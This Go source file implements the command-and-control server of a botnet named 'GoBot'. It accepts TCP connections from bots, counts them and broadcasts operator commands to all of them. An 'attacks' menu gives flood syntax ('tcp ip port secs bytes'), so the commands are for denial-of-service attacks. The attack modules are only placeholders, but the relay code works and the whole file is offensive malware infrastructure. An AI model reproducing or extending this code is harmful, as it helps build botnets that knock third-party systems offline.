package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
)

var (
	clients    = make(map[net.Conn]bool) // Map to store connected clients
	clientsMux sync.Mutex                // Mutex to synchronize access to the clients map
	broadcast  = make(chan string)       // Channel for broadcasting messages
)

// Function that handles when a client connects
func handleConnection(conn net.Conn, broadcast chan<- string) {
	defer conn.Close() //When the function ends in closes the connection

	//Makes a transaction
	clientsMux.Lock()
	clients[conn] = true
	clientsMux.Unlock()

	//Buffer between client and server
	buffer := make([]byte, 1024)

	//Just to know which client connected
	clientAddr := conn.RemoteAddr().String()
	fmt.Printf("Client connected: %s\n", clientAddr)

	for {
		//Check if its connected
		_, err := conn.Read(buffer)
		//If there is an error that means that the client disconnected
		if err != nil {
			clientsMux.Lock()
			delete(clients, conn)
			clientsMux.Unlock()
			fmt.Printf("Client disconnected: %s\n", clientAddr)
			return
		}

		//data := buffer[:n]
		//fmt.Printf("Received: %s", data)

		//broadcast <- string(data)
	}
}

// Send message to all connected clients
func broadcastMessages() {
	for {
		message := <-broadcast //Receives the message to send to the clients
		clientsMux.Lock()      //Makes sure no one modifies the client list while its working
		for client := range clients {
			_, err := client.Write([]byte(message)) //Sends message to clients
			if err != nil {
				fmt.Println("Error broadcasting data:", err)
			}
		}
		clientsMux.Unlock() //Finishes the transaction
	}
}

func main() {

	port := "8080"
	listener, err := net.Listen("tcp", ":"+port) //Starts listening in port

	if err != nil { //If error exits
		fmt.Println("Error:", err)
		os.Exit(1)
	}
	defer listener.Close() //Males sure to close the port when the function ends

	fmt.Println("Server listening on port", port)

	go broadcastMessages() //Starts subrutine that sends the message to the clients

	go func() { //Anonymous function that captures the commands written in cmd
		for {
			fmt.Print("GoBot> ")
			reader := bufio.NewReader(os.Stdin)
			command, _ := reader.ReadString('\n')
			command = strings.TrimRight(command, "\n")

			switch command {
			case "exit":
				fmt.Println("Exiting server.")
				close(broadcast)
				os.Exit(0)

			case "attacks":
				fmt.Println("	tcp ip port secs bytes")

			case "?", "help":
				fmt.Println("	attacks: shows all the possible attacks")
				fmt.Println("	command 2")
				fmt.Println("	command 3")
				fmt.Println("	command 4")

			case "show":
				fmt.Printf("Number of connected clients: %v\n", int(len(clients)))

			default:
				broadcast <- command //Takes the command and sends in to the channel
				//so that its broadcasted to the clients
			}
		}
	}()

	// Continue accepting client connections
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			continue
		}
		go handleConnection(conn, broadcast) // Handle the connection concurrently in a goroutine
	}
}
